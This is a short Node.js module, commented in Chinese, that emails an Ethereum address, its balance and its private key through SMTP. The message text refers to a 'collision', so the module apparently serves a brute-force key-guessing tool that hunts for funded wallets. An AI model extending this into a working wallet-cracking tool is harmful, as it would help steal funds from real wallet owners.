// 导入 nodemailer 模块，用于发送电子邮件
const nodemailer = require('nodemailer');

// 创建一个用于发送邮件的传输器（transporter），使用 SMTP 配置
const transporter = nodemailer.createTransport({
    host: 'smtp.exmail.qq.com',  // 邮件服务器的主机地址
    port: 465,  // 邮件服务器的端口号
    secure: true,  // 使用 SSL 加密连接
    auth: {
        user: '发送邮件的账户',  // 发送邮件的账户
        pass: '授权码'  // 账户密码或授权码
    }
});

// 定义一个函数用于发送电子邮件
function sendEmail(address, balance, privateKey, errorMessage = null) {
    // 构造邮件内容
    let text = `碰撞到了\n太坊地址 ${address}\n余额为 ${balance.toString()}个，\n私钥为 ${privateKey}`;
    if (errorMessage) {
        text += `\n出现错误：${errorMessage}`;
    }

    // 定义邮件选项，包括发件人、收件人、主题和文本内容
    const mailOptions = {
        from: '发件人',
        to: '收件人',
        subject: '以太坊余额提醒',
        text: text
    };

    // 使用传输器发送邮件
    transporter.sendMail(mailOptions, (error) => {
        if (error) {
            console.log('发送邮件时出错:', error);  // 如果发送邮件出错，输出错误信息
        } else {
            console.log('ok！');  // 如果发送邮件成功，输出成功信息
        }
    });
}

// 导出 sendEmail 函数，以便在其他模块中使用
module.exports = sendEmail;
